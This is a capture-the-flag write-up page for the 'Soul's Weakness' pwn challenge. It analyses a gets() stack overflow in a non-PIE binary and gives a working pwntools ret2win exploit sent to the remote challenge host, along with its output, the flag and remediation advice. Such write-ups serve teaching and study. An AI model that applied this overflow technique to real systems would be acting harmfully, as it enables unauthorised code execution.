@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Soul's Weakness · ByteMe CTF 26 writeup · NXT_CTFS</title>
+<meta name="description" content="An unstripped, non-PIE binary with no canary and a gets() into a 32-byte buffer. 40 bytes of padding and the address of soul_stone hijacks the return, verified against the remote." />
+<link rel="icon" href="../images/brand/logo-v2.png" type="image/png" />
+<link rel="stylesheet" href="../css/fonts.css?v=80d02232" />
+<link rel="stylesheet" href="../css/base.css?v=158fffd0" />
+<link rel="stylesheet" href="../css/components.css?v=0e2bdd96" />
+<link rel="stylesheet" href="../css/pages.css?v=8dc67e7f" />
+<script>document.documentElement.classList.add('js');</script>
+</head>
+<body>
+
+<nav class="nav" id="nav">
+  <div class="container nav-inner">
+    <div class="nav-id">
+      <a href="../index.html#top" class="brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span class="brand-name">NXT_CTFS</span>
+      </a>
+    </div>
+    <div class="nav-links">
+      <a href="../writeups.html" class="is-active">writeups</a>
+      <a href="../index.html#team">team</a>
+      <a href="../index.html#shell">try a box</a>
+      <a href="../index.html#join">join</a>
+    </div>
+    <div class="nav-cta">
+      <a href="../index.html#join" class="btn btn-secondary">Join us</a>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="4" y1="7" x2="20" y2="7"></line>
+          <line x1="4" y1="12" x2="20" y2="12"></line>
+          <line x1="4" y1="17" x2="20" y2="17"></line>
+        </svg>
+      </button>
+    </div>
+  </div>
+  <div class="mobile-panel" id="mobilePanel">
+    <a href="../writeups.html">writeups</a>
+    <a href="../index.html#team">team</a>
+    <a href="../index.html#shell">try a box</a>
+    <a href="../index.html#join">join</a>
+  </div>
+</nav>
+
+<div class="wu-progress" aria-hidden="true"><div class="wu-progress-bar" id="wuProgress"></div></div>
+  <main class="page-main container" id="top">
+  <nav class="crumbs" aria-label="Breadcrumb"><a href="../index.html#top">nxt_ctfs</a> <span aria-hidden="true">/</span> <a href="../writeups.html">writeups</a> <span aria-hidden="true">/</span> <span>souls-weakness</span></nav>
+
+  <header class="page-head">
+    
+    <div class="page-head-body">
+      <h1>Soul's Weakness <span class="page-sub">gets() overflow to a win function</span></h1>
+      <div class="page-meta"><span class="wu-cat wu-cat-pwn">pwn</span>
+      <span>200 pts</span></div>
+      
+      <div class="wu-flagrow">
+        <span class="wu-flagrow-k">flag</span>
+        <code id="wuFlag">OWASP{S0ul_St0ne_Buff3r_0v3rfl0w}</code>
+        <button type="button" class="wu-copy" data-copy="#wuFlag" aria-label="Copy flag">copy</button>
+      </div>
+    </div>
+  </header>
+
+    <div class="wu-layout">
+    <article class="wu-article">
+<p>Verified live against the remote service on 2026-10-09 (see
+<code>exploit.py REMOTE</code>).</p>
+<h2 id="1-triage"><a class="wu-anchor" href="#1-triage" aria-hidden="true">#</a>1. Triage</h2>
+<figure class="wu-code wu-code-output" data-lines="10">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-1"><code class="language-text">$ file soul
+soul: ELF 64-bit LSB executable, x86-64, ... dynamically linked ... not stripped
+
+$ checksec --file=./soul
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    SHSTK/IBT Enabled</code></pre>
+      
+    </figure><p>Not stripped, No PIE → fixed addresses, and the symbol table hands us the
+goal directly:</p>
+<figure class="wu-code wu-code-output" data-lines="5">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-text">$ nm soul
+00000000004011b6 T soul_stone     &lt;-- &quot;win&quot;
+00000000004011ee T vault         &lt;-- called by main
+0000000000401297 T main
+                 U gets@GLIBC_2.2.5   &lt;-- unpatchable</code></pre>
+      
+    </figure><p>Two smoking guns at once: an unstripped <code>soul_stone</code> function and a call to
+<code>gets()</code>. The story writes itself.</p>
+<h2 id="2-static-analysis"><a class="wu-anchor" href="#2-static-analysis" aria-hidden="true">#</a>2. Static analysis</h2>
+<p><code>main</code> just sets the <code>stdio</code> buffers to unbuffered and calls <code>vault</code>:</p>
+<figure class="wu-code wu-code-output" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-3"><code class="language-text">main:
+  4012f9: call vault</code></pre>
+      
+    </figure><p><code>vault</code> prints the vault banner, reads a line with <code>gets</code> into a 0x20-byte
+stack buffer, echoes it back, and returns:</p>
+<figure class="wu-code wu-code-output" data-lines="9">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-4" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-4"><code class="language-text">vault:
+  4011f6: sub  rsp, 0x20          ; 32-byte local buffer
+  ...
+  401227: lea  rax,[rip+...]      ; &quot;Enter the secret to unlock the Soul Stone: &quot;
+  401256: call gets@plt           ; &lt;-- UNBOUNDED read
+  40125b: ...
+  401271: call printf@plt         ; &quot;Hello, %s!\n&quot;
+  401294: leave
+  401295: ret</code></pre>
+      
+    </figure><p><code>gets</code> has no length limit, so the 32-byte buffer trivially overruns the
+saved RBP and the saved return address. No canary, so there is nothing to
+leak or preserve.</p>
+<p><code>soul_stone</code> is the target. It prints the unlock message and the flag:</p>
+<figure class="wu-code wu-code-output" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-5" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-5"><code class="language-text">soul_stone:
+  4011c8: puts  &quot;Soul Stone unlocked!&quot; / flag</code></pre>
+      
+    </figure><p>(The flag string is additionally visible with <code>strings soul</code> - the remote
+served the exact same string, confirming the binary and the deployed
+service match.)</p>
+<h2 id="3-offset-calculation"><a class="wu-anchor" href="#3-offset-calculation" aria-hidden="true">#</a>3. Offset calculation</h2>
+<p>Standard x86-64 prologue: <code>push rbp; mov rbp,rsp; sub rsp,0x20</code>. The buffer
+starts at <code>rbp-0x20</code>.</p>
+<figure class="wu-code wu-code-output" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-6" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-6"><code class="language-text">distance to saved RBP = 0x20 (32 bytes)
++ 8 bytes for saved RBP itself
+= 40 bytes to reach the saved return address</code></pre>
+      
+    </figure><p>So: <code>b&#39;A&#39; * 40 + p64(0x4011b6)</code>.</p>
+<p>Alignment note: <code>soul_stone</code> begins with <code>endbr64; push rbp; mov rbp,rsp</code>
+and calls <code>puts</code>, so if the libc <code>puts</code> implementation ever needed 16-byte
+stack alignment at the call site we might need a leading <code>ret</code> gadget. It
+does not matter here - <code>puts</code> was fine and the exploit worked first try
+both local and remote.</p>
+<h2 id="4-exploit"><a class="wu-anchor" href="#4-exploit" aria-hidden="true">#</a>4. Exploit</h2>
+<p><code>exploit.py</code>:</p>
+<figure class="wu-code" data-lines="9">
+      <figcaption>
+        
+        <span class="wu-code-lang">python</span>
+        <button type="button" class="wu-copy" data-copy="#code-7" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-7"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">HOST, PORT = <span class="hljs-string">&#x27;145.239.142.129&#x27;</span>, <span class="hljs-number">1337</span></span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">WIN = <span class="hljs-number">0x4011b6</span></span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">OFF = <span class="hljs-number">0x20</span> + <span class="hljs-number">8</span></span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc">io = remote(HOST, PORT)</span></span>
+<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc">io.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)</span></span>
+<span class="wu-line" data-line="8"><span class="wu-ln">8</span><span class="wu-lc">io.sendline(<span class="hljs-string">b&#x27;A&#x27;</span> * OFF + p64(WIN))</span></span>
+<span class="wu-line" data-line="9"><span class="wu-ln">9</span><span class="wu-lc"><span class="hljs-built_in">print</span>(io.recvall(timeout=<span class="hljs-number">5</span>).decode(errors=<span class="hljs-string">&#x27;replace&#x27;</span>))</span></span></code></pre>
+      
+    </figure><p>Run: <code>python3 exploit.py REMOTE</code> (or <code>python3 exploit.py</code> for the local
+run).</p>
+<p>Remote output:</p>
+<figure class="wu-code wu-code-output" data-lines="5">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-8" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-8"><code class="language-text">Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;garbage&gt;@!
+The Soul Stone remains sealed...
+
+[+] Soul Stone unlocked!
+OWASP{S0ul_St0ne_Buff3r_0v3rfl0w}</code></pre>
+      
+    </figure><p>The <code>AAAAAAAA...</code> echo is the 32 buffer bytes plus the two <code>A</code> bytes that
+clobbered the low byte of saved RBP; the <code>ret</code> then jumps straight into
+<code>soul_stone</code> (<code>0x4011b6</code> written <button type="button" class="wu-gloss" data-def="A byte order where the least-significant byte is stored first.">little-endian</button> shows up as the <code>\x11\x40</code> in
+the echoed line).</p>
+<h2 id="5-root-cause"><a class="wu-anchor" href="#5-root-cause" aria-hidden="true">#</a>5. Root cause</h2>
+<p>Return-address overwrite via <code>gets()</code> into a fixed 32-byte stack buffer,
+with no <button type="button" class="wu-gloss" data-def="A random value placed before a return address; if overwritten by a buffer overflow, the program detects it and aborts.">stack canary</button> and no PIE - a textbook ret2win.</p>
+<h2 id="6-remediation"><a class="wu-anchor" href="#6-remediation" aria-hidden="true">#</a>6. Remediation</h2>
+<ul>
+<li>Never use <code>gets()</code>; use <code>fgets(buf, sizeof buf, stdin)</code> or <code>getline</code>.</li>
+<li>Compile with <code>-fstack-protector-all</code> (canary) and <code>-fPIE -pie</code> (<button type="button" class="wu-gloss" data-def="Address Space Layout Randomization: randomizes memory addresses each run to make exploits harder to write reliably.">ASLR</button> on
+the code segment) to raise the bar; keep NX/RELRO as-is or go Full RELRO.</li>
+<li>Keep the flag out of the client binary - read it from a server-side
+file/env so a leaked/strings&#39;d binary cannot hand it over.</li>
+</ul>
+
+    </article>
+    <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#1-triage">1. Triage</a></li><li><a href="#2-static-analysis">2. Static analysis</a></li><li><a href="#3-offset-calculation">3. Offset calculation</a></li><li><a href="#4-exploit">4. Exploit</a></li><li><a href="#5-root-cause">5. Root cause</a></li><li><a href="#6-remediation">6. Remediation</a></li></ol>
+      </nav>
+  </div>
+
+  <nav class="wu-pager" aria-label="More writeups">
+    <a class="wu-pager-link wu-pager-prev" href="souls-whisper.html"><span class="wu-pager-dir">&larr; Previous</span><span class="wu-pager-name">Soul's Whisper</span></a>
+    <a class="wu-pager-link wu-pager-next" href="return-to-win.html"><span class="wu-pager-dir">Next &rarr;</span><span class="wu-pager-name">Return to Win</span></a>
+  </nav>
+</main>
+
+<footer class="footer container">
+  <div class="footer-grid">
+    <div>
+      <a href="../index.html#top" class="footer-brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span>NXT_CTFS</span>
+      </a>
+      <p class="footer-tag">A team built around curiosity, persistence, and the occasional 3am breakthrough.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Connect</h4>
+      <a href="https://discord.gg/AnmfSNMvS" target="_blank" rel="noopener noreferrer">Discord</a>
+      <a href="https://github.com/HappyCPPD/NxT-s-Team-Library" target="_blank" rel="noopener noreferrer">GitHub</a>
+      <a href="https://ctftime.org/team/442864" target="_blank" rel="noopener noreferrer">CTFtime</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>&copy; 2026 NXT_CTFS. All rights reserved.</span>
+    <span class="footer-hint">Two flags on this page. One is in the sandbox.</span>
+  </div>
+</footer>
+
+<script src="../js/script.js?v=4dd8bec6"></script>
+</body>
+</html>
